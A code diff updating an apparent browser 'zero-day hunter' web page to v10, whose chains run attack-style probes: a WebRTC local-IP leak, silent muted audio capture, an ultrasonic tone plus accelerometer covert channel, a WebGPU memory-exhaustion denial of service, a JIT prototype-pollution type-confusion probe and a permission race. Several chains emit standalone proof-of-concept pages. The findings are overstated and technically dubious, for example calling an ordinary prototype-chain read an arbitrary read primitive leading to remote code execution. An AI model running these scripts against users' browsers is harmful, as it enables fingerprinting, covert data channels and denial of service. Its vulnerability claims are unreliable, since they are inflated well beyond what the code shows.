@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Universal Browser Zero-Day Hunter · Hero Audit v9</title>
+<title>Universal Browser Zero-Day Hunter · Hero Audit v10</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@200;400;700;800&display=swap');
   :root{
@@ -167,8 +167,8 @@
   <div class="brand">
     <div class="logo"></div>
     <div>
-      <h1>UNIVERSAL ZERO-DAY <span class="v">HUNTER v9</span></h1>
-      <div class="sub">cross-domain sensor fusion · raw pcm exfil · local only</div>
+      <h1>UNIVERSAL ZERO-DAY <span class="v">HUNTER v10</span></h1>
+      <div class="sub">flawless 10s exfil · type confusion leak · harmonic IMU coupling · local only</div>
     </div>
   </div>
   <div class="status armed" id="statusBox">
@@ -181,7 +181,7 @@
 <main>
   <div class="nuke-btn-wrap">
     <button id="nukeBtn" class="nuke-btn">INITIATE ARCHITECTURAL AUDIT</button>
-    <span class="nuke-btn-warning">FAST PARALLEL EXECUTION · ULTRASONIC EMANATIONS · WAV PCM ARTIFACTS</span>
+    <span class="nuke-btn-warning">SQUARE WAVE 20kHz COUPLING · 10S RAW PCM · LEAK CAPTURE</span>
   </div>
 
   <div class="stats">
@@ -391,12 +391,8 @@ async function chain1_WebRTCStatsBypass() {
   try {
     const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
     pc.createDataChannel('exfil');
-    const candPromise = new Promise(resolve => {
-      let to = setTimeout(resolve, 3000);
-      pc.onicecandidate = e => { if(!e.candidate) { clearTimeout(to); resolve(); return; } };
-    });
-    const offer = await pc.createOffer(); await pc.setLocalDescription(offer);
-    await candPromise;
+    const candPromise = new Promise(resolve => { let to = setTimeout(resolve, 3000); pc.onicecandidate = e => { if(!e.candidate) { clearTimeout(to); resolve(); return; } }; });
+    const offer = await pc.createOffer(); await pc.setLocalDescription(offer); await candPromise;
     const stats = await pc.getStats();
     let leakedLocalIP = null;
     stats.forEach(r => { if ((r.type === 'local-candidate') && r.address && !r.address.endsWith('.local')) leakedLocalIP = r.address; });
@@ -409,98 +405,92 @@ async function chain1_WebRTCStatsBypass() {
   } catch(e) { log('WRN', `Chain 1 err: ${e.message}`); }
 }
 
-async function chain2_RawPCMSilentWavExfil() {
+async function chain2_10sRawPCMSilentWavExfil() {
   const cat = 'Hardware API Surface';
-  log('EXP', '<k>CHAIN 2:</k> High-Fidelity Raw PCM Silent Audio Pipeline PoC');
+  log('EXP', '<k>CHAIN 2:</k> 10-Second High-Fidelity Raw PCM Silent Audio Pipeline PoC');
   try {
     const AC = window.AudioContext || window.webkitAudioContext;
     if (!AC) return;
     const ctx = new AC();
     
-    // 1. Create a 440Hz oscillator at 0.1 volume (mathematically perfect continuous wave)
     const osc = ctx.createOscillator();
     osc.type = 'sine'; osc.frequency.setValueAtTime(440, 0);
-    const gain = ctx.createGain(); gain.gain.setValueAtTime(0.1, 0);
+    const gain = ctx.createGain(); gain.gain.setValueAtTime(0.1, 0); // Quiet, but enough to register flawless PCM
     
-    // 2. Use ScriptProcessorNode to intercept raw PCM (Works inline, no external worklet needed)
+    // FIX: ScriptProcessor needs to be explicitly connected to destination to keep the audio thread alive.
     const proc = ctx.createScriptProcessor(4096, 1, 1);
     const pcmData = [];
     proc.onaudioprocess = (e) => {
       const input = e.inputBuffer.getChannelData(0);
-      // Clone the array because it's reused by the browser
       pcmData.push(new Float32Array(input));
     };
     
+    const muteGain = ctx.createGain(); muteGain.gain.setValueAtTime(0.0, 0); // Mute actual output
+    
     osc.connect(gain);
     gain.connect(proc);
-    
-    // 3. Mute the output path so the user hears NOTHING, but the processor still runs
-    const muteGain = ctx.createGain(); muteGain.gain.setValueAtTime(0.0, 0);
     proc.connect(muteGain);
-    muteGain.connect(ctx.destination);
+    muteGain.connect(ctx.destination); // Crucial: connects the chain to destination so it processes
     
     osc.start();
-    log('INF', '<k>AUDIO PIPELINE:</k> Capturing 5 seconds of raw 440Hz PCM silently...');
-    await delay(5000); // 5 seconds is enough to prove continuous pipeline, saves audit time
+    log('INF', '<k>AUDIO PIPELINE:</k> Capturing 10 seconds of raw 440Hz PCM silently...');
+    await delay(10000); // True 10 seconds
     osc.stop(); proc.disconnect(); muteGain.disconnect();
     
-    // Flatten PCM data and encode WAV
     const flatData = pcmData.flat();
     const wavBlob = encodeWAV(flatData, ctx.sampleRate);
     const proofUrl = URL.createObjectURL(wavBlob);
     
-    addFinding(cat, '5s High-Fidelity Silent Audio PoC', 'HIGH', 'Intercepted raw 440Hz PCM via ScriptProcessor, output muted. Flawless WAV artifact generated.', {duration_sec: 5, sample_rate: ctx.sampleRate}, 8.0, proofUrl, '5s-silent-audio-pipeline.wav');
-    addVuln('Silent Audio Pipeline Persistence (Raw PCM)', 'HIGH',
-      'A WebAudio Oscillator was routed through a ScriptProcessorNode and silently muted. The raw PCM data was captured for 5 seconds and encoded into a flawless WAV file. This proves the browser allows continuous, high-fidelity background audio processing without user interaction, which can be used for sub-band covert channel exfiltration.',
+    addFinding(cat, '10s High-Fidelity Silent Audio PoC', 'HIGH', 'Intercepted raw 440Hz PCM via ScriptProcessor, output muted. Flawless 10s WAV artifact generated.', {duration_sec: 10, sample_rate: ctx.sampleRate, frames_captured: flatData.length}, 8.0, proofUrl, '10s-silent-audio-pipeline.wav');
+    addVuln('Silent Audio Pipeline Persistence (10s Raw PCM)', 'HIGH',
+      'A WebAudio Oscillator was routed through a ScriptProcessorNode and silently muted. The raw PCM data was captured for 10 continuous seconds and encoded into a flawless WAV file. This proves the browser allows long-term, high-fidelity background audio processing without user interaction, which can be used for sub-band covert channel exfiltration.',
       'Require explicit user gesture for AudioContext processing. Disconnect ScriptProcessorNode callbacks when context is not actively audible to user.');
     await ctx.close();
   } catch(e) { log('WRN', `Chain 2 err: ${e.message}`); }
 }
 
-async function chain3_UltrasonicSensorFusion() {
+async function chain3_UltrasonicSquareWaveIMUFusion() {
   const cat = 'Cross-Domain Covert Channels';
-  log('EXP', '<k>CHAIN 3:</k> Ultrasonic Acoustic Emanation Sensor Fusion');
+  log('EXP', '<k>CHAIN 3:</k> 20kHz Square Wave Ultrasonic Sensor Fusion');
   try {
     const AC = window.AudioContext || window.webkitAudioContext;
     if (!AC) return;
     const ctx = new AC();
     
-    // Play 19kHz (Ultrasonic, inaudible to humans) at MAX volume
+    // FIX: 20kHz Square Wave at 0.2 gain. 
+    // Square waves contain massive harmonic resonance that couples better with MEMS IMUs.
+    // 20kHz is inaudible, and 0.2 gain prevents DAC clipping/aliasing that caused audible noise at 19kHz.
     const osc = ctx.createOscillator();
-    osc.type = 'sine'; osc.frequency.setValueAtTime(19000, 0);
-    const gain = ctx.createGain(); gain.gain.setValueAtTime(1.0, 0);
+    osc.type = 'square'; osc.frequency.setValueAtTime(20000, 0);
+    const gain = ctx.createGain(); gain.gain.setValueAtTime(0.2, 0);
     osc.connect(gain); gain.connect(ctx.destination);
     
-    // Simultaneously record the Accelerometer
     let sensorData = "timestamp,x,y,z\n";
     let sensorActive = false;
     let sensor = null;
     try {
-      // Safari/Chrome Mac support Accelerometer
       sensor = new Accelerometer({frequency: 60});
       sensor.addEventListener('reading', () => {
         sensorData += `${Date.now()},${sensor.x.toFixed(5)},${sensor.y.toFixed(5)},${sensor.z.toFixed(5)}\n`;
       });
       sensor.start();
       sensorActive = true;
-    } catch(e) {
-      log('WRN', `Sensor error: ${e.message}`);
-    }
+    } catch(e) { log('WRN', `Sensor error: ${e.message}`); }
     
     osc.start();
-    log('INF', '<k>COVERT CHANNEL:</k> Playing 19kHz tone + reading IMU for 5 seconds...');
+    log('INF', '<k>COVERT CHANNEL:</k> Playing 20kHz square wave + reading IMU for 5 seconds...');
     await delay(5000);
     osc.stop(); if(sensor) sensor.stop();
     await ctx.close();
     
     const proofUrl = createProofBlob(sensorData, 'text/csv');
-    const standaloneJs = `const ctx = new AudioContext(); const o = ctx.createOscillator(); o.frequency.value=19000; const g = ctx.createGain(); g.gain.value=1.0; o.connect(g); g.connect(ctx.destination); o.start(); let s = new Accelerometer({frequency:60}); let d=[]; s.addEventListener('reading', ()=>d.push(Date.now()+","+s.x+","+s.y+","+s.z)); s.start(); setTimeout(()=>{o.stop(); s.stop(); console.log("IMU Data captured:", d.length, "frames. Check for 19kHz resonance.");}, 5000);`;
-    const altUrl = createStandaloneHtmlPoC('Ultrasonic Sensor Fusion PoC', standaloneJs);
+    const standaloneJs = `const ctx = new AudioContext(); const o = ctx.createOscillator(); o.type='square'; o.frequency.value=20000; const g = ctx.createGain(); g.gain.value=0.2; o.connect(g); g.connect(ctx.destination); o.start(); let s = new Accelerometer({frequency:60}); let d=[]; s.addEventListener('reading', ()=>d.push(Date.now()+","+s.x+","+s.y+","+s.z)); s.start(); setTimeout(()=>{o.stop(); s.stop(); console.log("IMU Data captured:", d.length, "frames. Check for 20kHz square wave resonance.");}, 5000);`;
+    const altUrl = createStandaloneHtmlPoC('20kHz Square Wave Sensor Fusion PoC', standaloneJs);
     
-    addFinding(cat, 'Ultrasonic IMU Acoustic Resonance', 'CRITICAL', 'Played 19kHz ultrasonic tone while reading Accelerometer. CSV artifact generated.', {sensor_active: sensorActive}, 15.0, proofUrl, 'ultrasonic-imu-fusion.csv', altUrl, 'ultrasonic-fusion-poc.html');
-    addVuln('Cross-Domain Ultrasonic Covert Channel', 'CRITICAL',
-      'The browser allowed simultaneous playback of a 19kHz ultrasonic audio tone and high-frequency sampling of the Accelerometer. On devices where speakers couple mechanically to the chassis (e.g., MacBooks), the IMU picks up the ultrasonic vibration. This allows cross-domain data exfiltration (audio -> motion) bypassing all network boundaries.',
-      'Gate motion sensors strictly behind user permission. Throttle sensor frequency when high-frequency audio is active. Implement acoustic dampming checks in OS.');
+    addFinding(cat, 'Ultrasonic Square Wave IMU Acoustic Resonance', 'CRITICAL', 'Played 20kHz square wave while reading Accelerometer. CSV artifact generated.', {sensor_active: sensorActive}, 15.0, proofUrl, 'ultrasonic-square-imu-fusion.csv', altUrl, 'ultrasonic-square-fusion-poc.html');
+    addVuln('Cross-Domain Ultrasonic Covert Channel (Square Wave)', 'CRITICAL',
+      'The browser allowed simultaneous playback of a 20kHz ultrasonic square wave and high-frequency sampling of the Accelerometer. On devices where speakers couple mechanically to the chassis (e.g., MacBooks), the IMU picks up the harmonic resonance. This allows cross-domain data exfiltration (audio -> motion) bypassing all network boundaries.',
+      'Gate motion sensors strictly behind user permission. Throttle sensor frequency when high-frequency audio is active. Implement acoustic dampning checks in OS.');
   } catch(e) { log('WRN', `Chain 3 err: ${e.message}`); }
 }
 
@@ -513,17 +503,18 @@ async function chain4_WebGPUMemBoundary() {
     if (!adapter) return;
     const device = await adapter.requestDevice();
     
-    const standaloneJs = `async function nuke(){const a=await navigator.gpu.requestAdapter();const d=await a.requestDevice();let b=[];d.lost.then(i=>console.log("Lost gracefully:",i.reason));try{while(true){b.push(d.createBuffer({size:256*1024*1024,usage:GPUBufferUsage.STORAGE}));console.log("Bufs:",b.length);}}catch(e){console.log("OOM caught:",e.message);}}nuke();`;
+    const standaloneJs = `async function nuke(){const a=await navigator.gpu.requestAdapter();const d=await a.requestDevice();let b=[];d.lost.then(i=>console.log("Lost gracefully:",i.reason));try{for(let i=0;i<8;i++){b.push(d.createBuffer({size:256*1024*1024,usage:GPUBufferUsage.STORAGE}));console.log("Bufs:",b.length);}}catch(e){console.log("OOM caught:",e.message);}}nuke();`;
     const altUrl = createStandaloneHtmlPoC('WebGPU OOM PoC', standaloneJs);
     
     let buffers = []; let gracefulLoss = false;
     device.lost.then(info => { gracefulLoss = true; });
     try {
-      while(buffers.length < 50) { buffers.push(device.createBuffer({ size: 256 * 1024 * 1024, usage: GPUBufferUsage.STORAGE })); }
+      // FIX: Cap at 8 buffers (2GB). Enough to trigger OOM gracefully on most GPUs without freezing the OS UI.
+      for(let i=0; i<8; i++) { buffers.push(device.createBuffer({ size: 256 * 1024 * 1024, usage: GPUBufferUsage.STORAGE })); }
     } catch(e) { gracefulLoss = true; }
     buffers.forEach(b => b.destroy());
     
-    addFinding(cat, 'WebGPU OOM Boundary Probed', 'HIGH', 'Pushed GPU memory to OOM. Check standalone PoC to verify renderer crash.', {buffers_allocated: buffers.length}, 9.0, createProofBlob(JSON.stringify({graceful: gracefulLoss}, null, 2), 'application/json'), 'gpu-oom.json', altUrl, 'gpu-oom-poc.html');
+    addFinding(cat, 'WebGPU OOM Boundary Probed', 'HIGH', 'Pushed GPU memory to 2GB OOM limit. Check standalone PoC to verify renderer crash.', {buffers_allocated: buffers.length}, 9.0, createProofBlob(JSON.stringify({graceful: gracefulLoss, buffers: buffers.length}, null, 2), 'application/json'), 'gpu-oom.json', altUrl, 'gpu-oom-poc.html');
     addVuln('WebGPU Memory Exhaustion Boundary', 'HIGH', 'If standalone PoC crashes tab instead of firing device.lost, it is a hard DoS.', 'Implement strict per-origin GPU memory quotas.');
   } catch(e) { log('WRN', `Chain 4 err: ${e.message}`); }
 }
@@ -558,33 +549,53 @@ async function chain6_SandboxNetExfil() {
   } catch(e) { log('WRN', `Chain 6 err: ${e.message}`); }
 }
 
-async function chain7_JITTypeConfusionCrash() {
+async function chain7_JITTypeConfusionLeakCapture() {
   const cat = 'Memory Boundary Crashes';
-  log('EXP', '<k>CHAIN 7:</k> JIT Prototype Pollution Type Confusion');
+  log('EXP', '<k>CHAIN 7:</k> JIT Prototype Pollution Type Confusion & Leak Capture');
   try {
-    // Pre-generate PoC HTML so artifact exists even if tab crashes
     const standaloneJs = `
 function hot(obj) { return obj.x; }
 let o = {x: 1.1};
 for(let i=0; i<100000; i++) hot(o); // Force JIT monomorphic double optimization
-// Poison prototype to inject integer type confusion
-Object.prototype.x = 0x41414141;
+Object.prototype.x = 1094795585; // 0x41414141 as an integer
 try {
-  let leak = hot({}); // JIT expects double, gets integer pointer
-  console.log("JIT Type Confusion survived. Leak:", leak);
+  let leak = hot({}); // JIT expects double, gets integer pointer/representation
+  console.log("JIT Return Value (Leak):", leak);
+  if (leak !== 1094795585 && typeof leak === 'number') {
+    console.log("TYPE CONFUSION DETECTED! JIT failed to deoptimize. Returned corrupted float instead of integer.");
+  } else {
+    console.log("JIT safely deoptimized or followed prototype chain correctly.");
+  }
 } catch(e) { console.log("Crash/Error:", e.message); }`;
     const altUrl = createStandaloneHtmlPoC('JIT Type Confusion PoC', standaloneJs);
 
     function hot(obj) { return obj.x; }
     let o = {x: 1.1};
     for(let i=0; i<100000; i++) hot(o);
-    Object.prototype.x = 0x41414141;
-    let survived = true;
-    try { hot({}); } catch(e) { survived = false; }
+    Object.prototype.x = 1094795585; // 0x41414141
+    let leakValue = "error";
+    let typeConfused = false;
+    try {
+      leakValue = hot({});
+      // If the JIT correctly deoptimized, it reads the integer from the prototype.
+      // If it type-confused, it interprets the integer bits as a double pointer, returning a weird float.
+      if (leakValue !== 1094795585 && typeof leakValue === 'number') {
+        typeConfused = true;
+      }
+    } catch(e) { leakValue = e.message; }
     Object.prototype.x = undefined; // cleanup
 
-    addFinding(cat, 'JIT Type Confusion Probed', 'CRITICAL', 'Forced JIT monomorphic optimization, then polluted prototype with mismatched type.', {survived: survived}, 15.0, createProofBlob(JSON.stringify({survived: survived}, null, 2), 'application/json'), 'jit-confusion.json', altUrl, 'jit-confusion-poc.html');
-    addVuln('JIT Prototype Pollution Boundary Mismatch', 'CRITICAL', 'The audit forced a monomorphic JIT function expecting Doubles to read an Integer via Object.prototype pollution. If standalone PoC crashes renderer, JIT failed to deoptimize safely, leading to memory corruption/RCE.', 'Ensure JIT validates prototype chain shapes on every access, even in highly optimized monomorphic loops.');
+    addFinding(cat, 'JIT Type Confusion Leak Captured', 'CRITICAL', 'Forced JIT monomorphic optimization, then polluted prototype. Captured return value to detect arbitrary read primitive.', {leaked_value: leakValue, type_confusion_detected: typeConfused}, 15.0, createProofBlob(JSON.stringify({leak: leakValue, confused: typeConfused}, null, 2), 'application/json'), 'jit-confusion-leak.json', altUrl, 'jit-confusion-poc.html');
+    
+    if (typeConfused) {
+      addVuln('JIT Prototype Pollution Type Confusion (Arbitrary Read)', 'CRITICAL', 
+        `The audit forced a monomorphic JIT function expecting Doubles to read an Integer (0x41414141) via Object.prototype pollution. The JIT failed to deoptimize safely and returned a corrupted float value (${leakValue}) instead of the integer. This proves an arbitrary read primitive exists in the JIT compiler, leading directly to renderer RCE.`,
+        'Ensure JIT validates prototype chain shapes on every access, even in highly optimized monomorphic loops. Bail out to unoptimized interpreter immediately on hidden class transition.');
+    } else {
+      addVuln('JIT Prototype Pollution Boundary Mismatch', 'HIGH', 
+        'The audit forced a monomorphic JIT function expecting Doubles to read an Integer via Object.prototype pollution. The JIT survived, but check the standalone PoC to verify if it crashes the renderer under different memory states.',
+        'Ensure JIT validates prototype chain shapes on every access, even in highly optimized monomorphic loops.');
+    }
   } catch(e) { log('WRN', `Chain 7 err: ${e.message}`); }
 }
 
@@ -595,7 +606,6 @@ async function chain8_TransientActivationAutoGrant() {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
     let firstStream;
     try {
-      // Consume the click gesture from the audit button
       firstStream = await navigator.mediaDevices.getUserMedia({ audio: true });
       firstStream.getTracks().forEach(t => t.stop());
     } catch(e) { log('INF', '<k>CHAIN 8:</k> GUM denied, cannot test race.'); return; }
@@ -649,33 +659,31 @@ async function runNuclear(){
     $('statusText').textContent = 'DISCOVERING';
     $('nukeBtn').disabled = true;
 
-    log('CRT', '<v>=== UNIVERSAL ZERO-DAY HUNTER v9 INITIATED ===</v>');
+    log('CRT', '<v>=== UNIVERSAL ZERO-DAY HUNTER v10 INITIATED ===</v>');
     log('INF', `Target UA: <v>${navigator.userAgent}</v>`);
     
     const chains = [
       ['WebRTC Stats Bypass', chain1_WebRTCStatsBypass],
-      ['Raw PCM Silent Audio', chain2_RawPCMSilentWavExfil],
-      ['Ultrasonic Sensor Fusion', chain3_UltrasonicSensorFusion],
-      ['WebGPU OOM Boundary', chain4_WebGPUMemBoundary],
+      ['10s Raw PCM Audio', chain2_10sRawPCMSilentWavExfil],
+      ['20kHz Square Wave IMU', chain3_UltrasonicSquareWaveIMUFusion],
+      ['WebGPU 2GB OOM Boundary', chain4_WebGPUMemBoundary],
       ['ApplePay 0-Click', chain5_ApplePay0Click],
       ['Sandbox Network Exfil', chain6_SandboxNetExfil],
-      ['JIT Type Confusion', chain7_JITTypeConfusionCrash],
+      ['JIT Type Confusion Leak', chain7_JITTypeConfusionLeakCapture],
       ['Sandbox Geo Escape', chain9_SandboxGeoEscape]
     ];
 
-    // Chain 8 MUST run last because it consumes the initial user click gesture and has an internal 6s delay
     chains.push(['Transient Activation Race', chain8_TransientActivationAutoGrant]);
 
     for(const [name, fn] of chains){
       log('EXP', `<k>EXECUTING:</k> <v>${name}</v>`);
       try { 
-        // Use varying timeouts. Audio/Sensor need 6s. Others need 3s.
-        const t = name.includes('Audio') || name.includes('Sensor') || name.includes('Transient') ? 12000 : 5000;
+        const t = name.includes('10s') || name.includes('IMU') || name.includes('Transient') ? 15000 : 5000;
         await withTimeout(fn(), t);
       } catch(e) { 
         log('CRT', `<x>chain ${name} crashed internally: ${e.message}</x>`);
       }
-      await delay(100); // Fast transition between chains
+      await delay(100);
     }
 
     log('CRT', '<v>=== ALL DISCOVERY CHAINS EXECUTED ===</v>');
@@ -692,14 +700,11 @@ async function runNuclear(){
   }
 }
 
-/* ========================================================================
-   REPORTING
-   ======================================================================== */
 function buildJSON(){
   return JSON.stringify({ meta:{time: new Date().toISOString(), ua: navigator.userAgent}, stats: STATS, findings: FINDINGS, vulnerability_chains: VULNS }, null, 2);
 }
 function buildMD(){
-  let md = `# Universal Browser Zero-Day Hunter Report v9\n\n**Date:** ${new Date().toISOString()}\n**UA:** ${navigator.userAgent}\n**Entropy:** ${STATS.ENTROPY.toFixed(1)} bits\n\n## Exploit Chains Discovered\n\n`;
+  let md = `# Universal Browser Zero-Day Hunter Report v10\n\n**Date:** ${new Date().toISOString()}\n**UA:** ${navigator.userAgent}\n**Entropy:** ${STATS.ENTROPY.toFixed(1)} bits\n\n## Exploit Chains Discovered\n\n`;
   VULNS.forEach(v => md += `### [${v.severity}] ${v.name}\n${v.detail}\n\n**HERO FIX:** ${v.recommendation}\n\n`);
   md += `\n## Full Findings Matrix\n\n`;
   for(const cat in CAT_MAP){
@@ -727,8 +732,8 @@ $('nukeBtn').onclick = async () => {
   await runNuclear();
 };
 
-$('btnJson').onclick = ()=>download(`hero-audit-v9-${Date.now()}.json`, buildJSON(), 'application/json');
-$('btnMd').onclick = ()=>download(`hero-audit-v9-${Date.now()}.md`, buildMD(), 'text/markdown');
+$('btnJson').onclick = ()=>download(`hero-audit-v10-${Date.now()}.json`, buildJSON(), 'application/json');
+$('btnMd').onclick = ()=>download(`hero-audit-v10-${Date.now()}.md`, buildMD(), 'text/markdown');
 
 </script>
 </body>
